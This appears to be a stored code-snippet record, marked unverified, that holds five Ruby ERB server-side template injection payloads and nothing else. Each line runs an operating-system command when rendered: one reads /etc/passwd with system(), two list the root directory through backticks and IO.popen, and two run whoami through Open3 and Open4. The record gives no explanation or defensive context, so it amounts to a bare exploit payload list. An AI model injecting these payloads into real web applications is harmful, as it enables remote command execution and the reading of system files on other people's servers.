---
id: d7d5c66a-a7f3-4de1-ad42-e365e472935a
type: code
language: Ruby
verified: false
created_at: '2023-04-06T03:56:40.226082+00:00'
updated_at: '2023-04-10T20:23:29.592872+00:00'
---

# Code Snippet d7d5c66a

**Language**: Ruby

```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
